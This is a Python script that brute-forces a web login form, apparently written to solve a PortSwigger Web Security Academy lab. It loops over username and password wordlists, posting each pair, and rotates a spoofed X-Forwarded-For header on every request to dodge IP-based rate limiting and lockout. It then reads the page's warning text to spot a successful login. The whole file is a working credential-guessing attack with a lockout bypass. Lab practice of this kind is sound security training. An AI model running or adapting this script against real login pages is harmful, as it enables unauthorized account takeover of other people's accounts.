import requests
from bs4 import BeautifulSoup

#url = "https://0aa5002703de6cbbc043682000990090.web-security-academy.net/login"
url = "https://0a8c00a5036ad11ec00a7e8300100072.web-security-academy.net/login"
username = open("username.txt","r").readlines()
password = open("password.txt","r").readlines()
index = "oz"

#last brute
#username=affiliates&password=administrator

for user in username:
	for pas in password:
		user = user.replace("\n","")
		pas = pas.replace("\n","")
		data = f"username={user}&password={pas}"
		print(data)
		headers = {
		"X-Forwarded-For" : index
		}


		response = requests.post(url, data=data, headers=headers)
		soup = str(BeautifulSoup(response.text, 'html.parser').find('p', class_='is-warning').get_text().strip())
		print(soup)
		print(data)

		if ("Invalid username or password." == soup):
			print("next")
		else:
			print(f"ini username {username}")
			break

		index += "a"